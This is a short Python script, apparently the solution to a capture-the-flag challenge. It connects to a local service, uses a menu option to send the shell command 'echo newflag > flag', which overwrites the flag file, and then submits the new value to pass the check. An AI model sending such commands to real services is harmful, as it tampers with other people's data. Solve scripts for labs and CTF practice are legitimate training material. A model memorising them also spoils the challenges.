import socket
import argparse

def netcat_read(s):
	response = s.recv(2048).decode()
	for line in response.splitlines():
		print("<< "+line)

	return response

def netcat_write(s, message):
	for line in message.splitlines():
		print(">> "+line)

	s.sendall((message+"\n").encode())

def main():
	parser = argparse.ArgumentParser(description="Run the solve")
	parser.add_argument(
		"--port", 
		"-p", 
		action="store", 
		type=int,
		default=8888, 
		help="Port to connect on", 
		required=False
	)
	parser.add_argument(
		"--host",
		action="store",
		default="127.0.0.1",
		help="Host for server",
		required=False,
	)

	args = parser.parse_args()
	HOST, PORT = args.host, args.port
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((HOST,PORT))

	netcat_read(s)

	netcat_write(s, "1")
	netcat_read(s)
	netcat_write(s, "echo newflag > flag")
	netcat_read(s)
	netcat_write(s, "exit")

	netcat_read(s)
	netcat_write(s, "3")
	netcat_read(s)
	netcat_write(s, "newflag")
	netcat_read(s)
	netcat_read(s)

if __name__ == "__main__":
	main()
